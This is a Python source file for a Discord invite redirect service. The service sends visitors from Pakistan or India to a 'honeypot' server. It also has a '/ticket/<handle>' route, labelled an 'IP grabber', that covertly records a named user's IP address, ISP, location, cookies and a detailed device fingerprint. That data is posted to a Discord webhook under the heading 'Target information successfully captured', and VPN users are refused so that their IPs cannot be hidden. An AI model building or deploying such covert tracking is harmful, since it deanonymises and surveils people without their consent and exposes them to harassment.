"""
GeoIP Redirect Service

This service redirects users based on their country of origin using GeoIP data. 
Users from Pakistan or India will be redirected to an alternative server, while users from other countries will be redirected to a default subdomain.

Dependencies:
- quart: An asynchronous web microframework for Python.

"""

import ipaddress
import requests
from datetime import datetime
from user_agents import parse
from logger import Logger
from json_handler import *
from quart import Quart, jsonify, redirect, render_template, request, send_file

app = Quart(__name__)
l = Logger(console_log= True, file_logging=True, file_URI='logs/log.txt', override=True)
default_server:str
alternative_server_url:str
test_flag:bool
redirected:bool
config:dict
sub_nets: list

def read_subnets_from_file(filename):
    global sub_nets
    """
    Read subnets from a text file.

    Parameters:
    filename (str): Name of the text file containing subnets.

    Returns:
    list: List of subnets in CIDR notation.
    """
    subnets = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                line = line.strip()
                if line:  # Skip empty lines
                    subnets.append(line)
        return subnets
    except FileNotFoundError:
        print("File not found.")
        return []

def ip_in_subnet(ip, subnet):
    """
    Check if an IP address belongs to a subnet.

    Parameters:
    ip (str): IP address.
    subnet (str): Subnet in CIDR notation.

    Returns:
    bool: True if IP address belongs to subnet, False otherwise.
    """
    if ip == None:
        return False
    try:
        ip_obj = ipaddress.ip_address(ip)
        subnet_obj = ipaddress.ip_network(subnet)
        return ip_obj in subnet_obj
    except ValueError as e:
        print("Error:", e)
        return False
    
async def check_for_vpn(ip):
    global sub_nets
    return any(ip_in_subnet(ip, subnet) for subnet in sub_nets)

def extract_device_info(request_obj):
    """
    Extract comprehensive device and browser information from the request.

    Args:
    - request_obj: The Quart request object

    Returns:
    - dict: Dictionary containing device information
    """
    headers = request_obj.headers

    # User Agent parsing
    user_agent_string = headers.get('User-Agent', 'Unknown')
    user_agent = parse(user_agent_string)

    # Extract cookies
    cookies = dict(request_obj.cookies) if request_obj.cookies else {}

    # Extract detailed information
    device_info = {
        'user_agent_string': user_agent_string,
        'browser_family': user_agent.browser.family,
        'browser_version': user_agent.browser.version_string,
        'os_family': user_agent.os.family,
        'os_version': user_agent.os.version_string,
        'device_family': user_agent.device.family,
        'device_brand': user_agent.device.brand,
        'device_model': user_agent.device.model,
        'is_mobile': user_agent.is_mobile,
        'is_tablet': user_agent.is_tablet,
        'is_pc': user_agent.is_pc,
        'is_bot': user_agent.is_bot,

        # HTTP Headers
        'accept_language': headers.get('Accept-Language', 'Unknown'),
        'accept_encoding': headers.get('Accept-Encoding', 'Unknown'),
        'accept': headers.get('Accept', 'Unknown'),
        'referer': headers.get('Referer', 'Direct'),
        'host': headers.get('Host', 'Unknown'),
        'connection': headers.get('Connection', 'Unknown'),
        'cache_control': headers.get('Cache-Control', 'Unknown'),
        'upgrade_insecure_requests': headers.get('Upgrade-Insecure-Requests', 'Unknown'),
        'sec_fetch_site': headers.get('Sec-Fetch-Site', 'Unknown'),
        'sec_fetch_mode': headers.get('Sec-Fetch-Mode', 'Unknown'),
        'sec_fetch_dest': headers.get('Sec-Fetch-Dest', 'Unknown'),
        'sec_ch_ua': headers.get('Sec-CH-UA', 'Unknown'),
        'sec_ch_ua_mobile': headers.get('Sec-CH-UA-Mobile', 'Unknown'),
        'sec_ch_ua_platform': headers.get('Sec-CH-UA-Platform', 'Unknown'),
        'sec_ch_ua_platform_version': headers.get('Sec-CH-UA-Platform-Version', 'Unknown'),
        'sec_ch_ua_arch': headers.get('Sec-CH-UA-Arch', 'Unknown'),
        'sec_ch_ua_model': headers.get('Sec-CH-UA-Model', 'Unknown'),
        'sec_ch_ua_bitness': headers.get('Sec-CH-UA-Bitness', 'Unknown'),
        'sec_ch_ua_wow64': headers.get('Sec-CH-UA-WoW64', 'Unknown'),
        'sec_ch_ua_full_version_list': headers.get('Sec-CH-UA-Full-Version-List', 'Unknown'),
        'sec_ch_viewport_width': headers.get('Sec-CH-Viewport-Width', 'Unknown'),
        'sec_ch_viewport_height': headers.get('Sec-CH-Viewport-Height', 'Unknown'),
        'sec_ch_dpr': headers.get('Sec-CH-DPR', 'Unknown'),
        'sec_ch_device_memory': headers.get('Sec-CH-Device-Memory', 'Unknown'),
        'sec_ch_downlink': headers.get('Sec-CH-Downlink', 'Unknown'),
        'sec_ch_ect': headers.get('Sec-CH-ECT', 'Unknown'),
        'sec_ch_rtt': headers.get('Sec-CH-RTT', 'Unknown'),
        'sec_ch_save_data': headers.get('Sec-CH-Save-Data', 'Unknown'),
        'sec_ch_prefers_color_scheme': headers.get('Sec-CH-Prefers-Color-Scheme', 'Unknown'),
        'sec_ch_prefers_reduced_motion': headers.get('Sec-CH-Prefers-Reduced-Motion', 'Unknown'),

        # Additional network info
        'x_forwarded_for': headers.get('X-Forwarded-For', 'Unknown'),
        'x_real_ip': headers.get('X-Real-IP', 'Unknown'),
        'cf_connecting_ip': headers.get('CF-Connecting-IP', 'Unknown'),
        'cf_ipcountry': headers.get('CF-IPCountry', 'Unknown'),
        'cf_ray': headers.get('CF-Ray', 'Unknown'),
        'cf_visitor': headers.get('CF-Visitor', 'Unknown'),
        'x_forwarded_proto': headers.get('X-Forwarded-Proto', 'Unknown'),
        'x_forwarded_port': headers.get('X-Forwarded-Port', 'Unknown'),

        # Browser fingerprinting headers
        'dnt': headers.get('DNT', 'Unknown'),  # Do Not Track
        'pragma': headers.get('Pragma', 'Unknown'),
        'if_modified_since': headers.get('If-Modified-Since', 'Unknown'),
        'if_none_match': headers.get('If-None-Match', 'Unknown'),
        'te': headers.get('TE', 'Unknown'),  # Transfer encoding
        'authorization': 'REDACTED' if headers.get('Authorization') else 'None',

        # Cookies and session data
        'cookies': cookies,
        'cookie_count': len(cookies),
        'has_session_cookies': any('session' in k.lower() or 'auth' in k.lower() or 'token' in k.lower() for k in cookies.keys()),
        'has_tracking_cookies': any('ga' in k.lower() or 'gtm' in k.lower() or 'fb' in k.lower() or '_utm' in k.lower() or 'analytics' in k.lower() for k in cookies.keys()),

        # Request metadata
        'method': request_obj.method,
        'scheme': request_obj.scheme,
        'path': request_obj.path,
        'query_string': request_obj.query_string.decode('utf-8') if request_obj.query_string else '',
        'content_type': request_obj.content_type or 'Unknown',
        'content_length': headers.get('Content-Length', 'Unknown'),

        # Timestamp
        'access_time': datetime.now().isoformat(),
        'access_timestamp': datetime.now().timestamp()
    }

    return device_info

def send_to_channel(message:str, embed_data=None):
    """
    Sends a message using Discord webhook with optional embed support.

    Args:
    - message (str): The message to send.
    - embed_data (dict): Optional embed data for rich formatting.

    Returns:
    - bool: True if the message was sent successfully, False otherwise.
    """
    global config
    
    # Create payload
    payload = {}

    if embed_data:
        payload = {
            "embeds": [embed_data]
        }
        if message:
            payload["content"] = message
    else:
        payload = {
            "content": message
        }

    try:
        # Send POST request to the webhook URL
        response = requests.post(config["dc_webhook_url"], json=payload)
        response.raise_for_status()  # Raise an exception for any HTTP error status

        # Check if the message was sent successfully
        if response.status_code == 204:
            l.passing("Message sent successfully")
            return True
        else:
            l.error(f"Failed to send message. Status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        l.error(f"Failed to send message: {e}")
        return False

def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
    """
    Create a rich Discord embed for honeypot triggers.
    """
    embed = {
        "title": "🚨 HONEYPOT TRIGGERED 🚨",
        "description": f"Suspicious user detected from **{country_code}**",
        "color": 0xff4757,  # Red color
        "timestamp": datetime.now().isoformat(),
        "thumbnail": {
            "url": "https://cdn.discordapp.com/emojis/1234567890.png"  # You can add a warning icon URL
        },
        "fields": [
            {
                "name": "🌐 Network Information",
                "value": f"**IP Address:** `{ip}`\n**Country:** {country_code}\n**More Info:** [Click here](https://iplocation.com/?ip={ip})",
                "inline": False
            },
            {
                "name": "🔗 Honeypot Destination",
                "value": f"`{honeypot}`",
                "inline": False
            }
        ],
        "footer": {
            "text": "DC-Shield Security System",
            "icon_url": "https://cdn.discordapp.com/emojis/shield.png"
        }
    }

    if device_info:
        # Add device information fields
        device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
        device_value += f"**OS:** {device_info['os_family']} {device_info['os_version']}\n"
        device_value += f"**Device:** {device_info['device_family']}"
        if device_info['device_brand'] and device_info['device_brand'] != 'None':
            device_value += f" ({device_info['device_brand']} {device_info['device_model']})"

        device_type = "📱 Mobile" if device_info['is_mobile'] else "💻 Desktop" if device_info['is_pc'] else "📟 Tablet" if device_info['is_tablet'] else "🤖 Bot" if device_info['is_bot'] else "❓ Unknown"
        device_value += f"\n**Type:** {device_type}"

        embed["fields"].append({
            "name": "📱 Device Information",
            "value": device_value,
            "inline": True
        })

        # Network details
        network_value = f"**Language:** {device_info['accept_language'][:30]}...\n"
        network_value += f"**Referer:** {device_info['referer'][:50]}...\n"
        network_value += f"**Time:** {device_info['access_time']}"

        embed["fields"].append({
            "name": "🌍 Connection Details",
            "value": network_value,
            "inline": True
        })

    return embed

def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info):
    """
    Create a rich Discord embed for IP grabber triggers.
    """
    embed = {
        "title": "🎯 IP GRABBER ACTIVATED",
        "description": f"Target information successfully captured",
        "color": 0x3742fa,  # Blue color
        "timestamp": datetime.now().isoformat(),
        "thumbnail": {
            "url": "https://cdn.discordapp.com/emojis/target.png"  # You can add a target icon URL
        },
        "fields": [
            {
                "name": "👤 Target Identification",
                "value": f"**Username:** `{dc_handle}`\n**VPN Status:** {'🔒 Detected' if vpn else '❌ None'}",
                "inline": True
            },
            {
                "name": "🌐 Location Data",
                "value": f"**IP:** `{ip_address}`\n**Country:** {country_name} ({country_code2})\n**ISP:** {isp}",
                "inline": True
            }
        ],
        "footer": {
            "text": "DC-Shield IP Intelligence",
            "icon_url": "https://cdn.discordapp.com/emojis/globe.png"
        }
    }

    # Device information
    device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
    device_value += f"**OS:** {device_info['os_family']} {device_info['os_version']}\n"
    device_value += f"**Device:** {device_info['device_family']}"
    if device_info['device_brand'] and device_info['device_brand'] != 'None':
        device_value += f" ({device_info['device_brand']} {device_info['device_model']})"

    device_type = "📱 Mobile" if device_info['is_mobile'] else "💻 Desktop" if device_info['is_pc'] else "📟 Tablet" if device_info['is_tablet'] else "🤖 Bot" if device_info['is_bot'] else "❓ Unknown"
    device_value += f"\n**Type:** {device_type}"

    embed["fields"].append({
        "name": "📱 Device Fingerprint",
        "value": device_value,
        "inline": False
    })

    # Cookie and tracking information
    if device_info['cookie_count'] > 0:
        cookie_value = f"**Total Cookies:** {device_info['cookie_count']}\n"
        cookie_value += f"**Session Cookies:** {'⚠️ Yes' if device_info['has_session_cookies'] else '✅ No'}\n"
        cookie_value += f"**Tracking Cookies:** {'⚠️ Yes' if device_info['has_tracking_cookies'] else '✅ No'}"

        embed["fields"].append({
            "name": "🍪 Cookie Analysis",
            "value": cookie_value,
            "inline": True
        })

    # Hardware information
    if device_info['sec_ch_device_memory'] != 'Unknown' or device_info['sec_ch_dpr'] != 'Unknown':
        hardware_value = ""
        if device_info['sec_ch_device_memory'] != 'Unknown':
            hardware_value += f"**Memory:** {device_info['sec_ch_device_memory']} GB\n"
        if device_info['sec_ch_dpr'] != 'Unknown':
            hardware_value += f"**Screen DPR:** {device_info['sec_ch_dpr']}\n"
        if device_info['sec_ch_ua_arch'] != 'Unknown':
            hardware_value += f"**Architecture:** {device_info['sec_ch_ua_arch']}"

        if hardware_value:
            embed["fields"].append({
                "name": "⚙️ Hardware Specs",
                "value": hardware_value,
                "inline": True
            })

    # Network performance
    network_perf = ""
    if device_info['sec_ch_downlink'] != 'Unknown':
        network_perf += f"**Speed:** {device_info['sec_ch_downlink']} Mbps\n"
    if device_info['sec_ch_rtt'] != 'Unknown':
        network_perf += f"**Latency:** {device_info['sec_ch_rtt']}ms\n"
    network_perf += f"**Language:** {device_info['accept_language'][:20]}..."

    embed["fields"].append({
        "name": "🌍 Network Performance",
        "value": network_perf,
        "inline": True
    })

    # Add link to more info
    embed["fields"].append({
        "name": "🔗 Additional Information",
        "value": f"[View detailed IP analysis](https://iplocation.com/?ip={ip_address})",
        "inline": False
    })

    return embed

async def get_country(ip_address):
    """Retrieve country information for the given IP address."""
    try:
        response = await request_ip_location(ip_address)
        if response and response.get("response_code") == "200":
            country_code = response.get("country_code2")
            return country_code
    except Exception as e:
        l.error(f"Error fetching country information: {e}")
    return None

async def request_ip_location(ip_address):
    """Make a request to the IP location API."""
    url = f"https://api.iplocation.net/?cmd=ip-country&ip={ip_address}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        l.error(f"Error fetching IP location: {e}")
    return None

async def redirect_handler(ip ,normal_server, honeypot, request_obj=None):
    global redirected
    country_code = await get_country(ip)
    l.info(f'Country code is: {country_code}')
    #if test flag is set redirect every 2nd request to honeypot
    if test_flag:
        if redirected:
            country_code = 'PK'
            l.info(f'Test flag, changed coutry code: {country_code}')
        else:
            l.info('Test flag, not changing coutry code')
        redirected = not redirected
        
    if country_code and country_code in ['PK', 'IN']:
        l.info(f"Rediredcting to Honeypot: {honeypot}")

        # Extract device information if request object is provided
        honeypot_message = f'''
🚨 **Honeypot Triggered** 🚨
🌐 **IP:** {ip}
🏳️ **Country:** {country_code}
🔗 **Honeypot:** {honeypot}
🔗 **More info:** https://iplocation.com/?ip={ip}
'''

        if request_obj:
            device_info = extract_device_info(request_obj)
            l.info(f'Honeypot device info: {device_info}')

            honeypot_message = f'''
🚨 **Honeypot Triggered** 🚨
🌐 **IP:** {ip}
🏳️ **Country:** {country_code}
🔗 **Honeypot:** {honeypot}

📱 **Device Information:**
• **Browser:** {device_info['browser_family']} {device_info['browser_version']}
• **OS:** {device_info['os_family']} {device_info['os_version']}
• **Device:** {device_info['device_family']} ({device_info['device_brand']} {device_info['device_model']})
• **Type:** {'📱 Mobile' if device_info['is_mobile'] else '💻 Desktop' if device_info['is_pc'] else '📟 Tablet' if device_info['is_tablet'] else '🤖 Bot' if device_info['is_bot'] else 'Unknown'}

🌍 **Network Details:**
• **Language:** {device_info['accept_language']}
• **Referer:** {device_info['referer']}
• **User Agent:** {device_info['user_agent_string'][:100]}...
• **Time:** {device_info['access_time']}

🔗 **More info:** https://iplocation.com/?ip={ip}
'''

        # Create and send embed message
        embed = create_honeypot_embed(ip, country_code, honeypot, device_info)
        send_to_channel(None, embed)

        return redirect(honeypot)
    elif await check_for_vpn(ip):
        return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to join the Discord.'
    
    else:
        l.info(f"Rediredcting to: {normal_server}")
        return redirect(normal_server)

@app.route('/')
async def index():
    l.info('Default route called.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    try:
        return await redirect_handler(ip_address, default_server, alternative_server_url, request)
    except Exception as e:
        l.error(f'{e}')
        
@app.route('/health')
async def health():
    l.info('Health route called.')
    return 200
        
@app.route('/ticket/<path:dc_handle>')
async def ip_grab(dc_handle):
    l.info('Grabber called.')
    l.info(f'user is: {dc_handle}')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    vpn = await check_for_vpn(ip_address)

    # Extract comprehensive device information
    device_info = extract_device_info(request)

    try:
        data = await request_ip_location(ip_address)
        ip = data['ip']
        ip_number = data['ip_number']
        ip_version = data['ip_version']
        country_name = data['country_name']
        country_code2 = data['country_code2']
        isp = data['isp']

        l.info(f'IP data: {data}\nVPN: {vpn}')
        l.info(f'Device info: {device_info}')

        # Enhanced Discord message with device information
        cookie_info = ""
        if device_info['cookie_count'] > 0:
            cookie_info = f"\n🍪 **Cookie Information:**\n• **Count:** {device_info['cookie_count']}\n• **Session Cookies:** {'Yes' if device_info['has_session_cookies'] else 'No'}\n• **Tracking Cookies:** {'Yes' if device_info['has_tracking_cookies'] else 'No'}"

        hardware_info = ""
        if device_info['sec_ch_device_memory'] != 'Unknown' or device_info['sec_ch_dpr'] != 'Unknown':
            hardware_info = f"\n⚙️ **Hardware Details:**\n• **Device Memory:** {device_info['sec_ch_device_memory']} GB\n• **Screen DPR:** {device_info['sec_ch_dpr']}\n• **Architecture:** {device_info['sec_ch_ua_arch']}"

        # Create and send embed message
        embed = create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info)
        send_to_channel(None, embed)

        if vpn:
            return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to create a ticket.'

        dc_handle += '?'
        return await render_template('result.html',
                                   dc_handle=dc_handle,
                                   ip=ip,
                                   ip_number=ip_number,
                                   ip_version=ip_version,
                                   country_name=country_name,
                                   country_code2=country_code2,
                                   isp=isp,
                                   device_info=device_info)
    except Exception as e:
        l.error(f'{e}')
    return
   
@app.route('/<path:dc_invite>')
async def refer(dc_invite):
    l.info('Custom route called.')
    l.info(f'Route is: {dc_invite}')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    custom_server = f'https://discord.gg/{dc_invite}'
    try:
        return await redirect_handler(ip_address, custom_server, alternative_server_url, request)
    except Exception as e:
            l.error(f'{e}')
    
@app.route('/<path:dc_invite>/<path:honeypot>')
async def refer_custom(dc_invite, honeypot):
    l.info('Custom route called with custom honeypot.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    l.info(f'Route is: {dc_invite}/{honeypot}')
    custom_server = f'https://discord.gg/{dc_invite}'
    custom_honeypot = f'https://discord.gg/{honeypot}'
    try:
        return await redirect_handler(ip_address, custom_server, custom_honeypot, request)
    except Exception as e:
            l.error(f'{e}')

# Route for serving favicon.ico
@app.route('/favicon.ico')
async def favicon():
    return await send_file('favicon.ico')

if __name__ == '__main__':
    
    try:
        config = read_json_file('config.json')
    except FileNotFoundError as e:
        l.error(e)
        l.passing('Trying to gather config from env vars')
        config = get_env_vars()
        l.console_log(config)
    sub_nets = read_subnets_from_file('ipv4.txt') # txt file courtesy of https://github.com/X4BNet/lists_vpn
    test_flag = config['test_flag']
    redirected = False
    if test_flag:
        l.passing('Test flag is set, every second request will be directed to the honey pot')
    default_server = config['default_server']

    alternative_server_url = config['honeypot_server']
    
    app_port = int(config['app_port'])
    
    
    app.run(host='0.0.0.0',port = app_port)